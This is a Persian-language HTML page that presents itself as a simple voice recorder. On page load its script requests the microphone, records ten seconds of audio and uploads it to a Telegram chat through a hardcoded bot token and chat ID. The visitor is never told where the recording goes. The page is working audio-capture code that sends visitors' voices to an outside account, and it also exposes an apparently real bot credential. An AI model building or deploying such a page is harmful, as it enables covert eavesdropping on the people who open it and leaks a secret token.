<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ضبط صدا</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: sans-serif;
      background: #f2f2f2;
      padding: 20px;
      text-align: center;
    }
    .status {
      margin-top: 20px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>ضبط صدای خودکار</h2>
  <p class="status" id="status">در حال آماده‌سازی...</p>

  <script>
    const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";
    const chatId = "1120400003";
    const statusText = document.getElementById("status");

    async function startAutoRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];

        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);

        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
          sendVoice(audioBlob);
        };

        mediaRecorder.start();
        statusText.innerText = "🎙 در حال ضبط به مدت ۱۰ ثانیه...";

        setTimeout(() => {
          mediaRecorder.stop();
          statusText.innerText = "⏳ در حال ارسال صدا...";
        }, 10000);
      } catch (error) {
        statusText.innerText = "❌ دسترسی به میکروفون رد شد یا خطایی رخ داد.";
      }
    }

    function sendVoice(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("voice", blob);

      fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
        method: "POST",
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          statusText.innerText = "✅ صدا با موفقیت ارسال شد!";
        } else {
          statusText.innerText = "❌ خطا در ارسال صدا!";
        }
      })
      .catch(() => {
        statusText.innerText = "❌ خطا در اتصال به تلگرام!";
      });
    }

    // اجرای خودکار بعد از لود صفحه
    window.onload = startAutoRecording;
  </script>
</body>
</html>
